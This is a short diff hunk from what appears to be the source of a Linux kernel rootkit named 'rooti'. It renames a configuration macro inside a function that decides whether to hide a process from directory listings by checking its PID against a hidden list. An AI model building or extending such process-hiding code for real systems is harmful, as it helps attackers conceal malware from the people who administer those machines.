@@ -68,7 +68,7 @@ static bool rooti_should_hide_proc(struct linux_dirent64 *record)
     if (err)
         return false;
 
-#ifndef ROOTI_HIDE_CHILD_PROCS
+#ifndef ROOTI_CONFIG_HIDE_CHILD_PROCS
     return rooti_pid_list_contains(pid, &rooti_hidden_pids);
 #else
     struct pid *pid_struct;
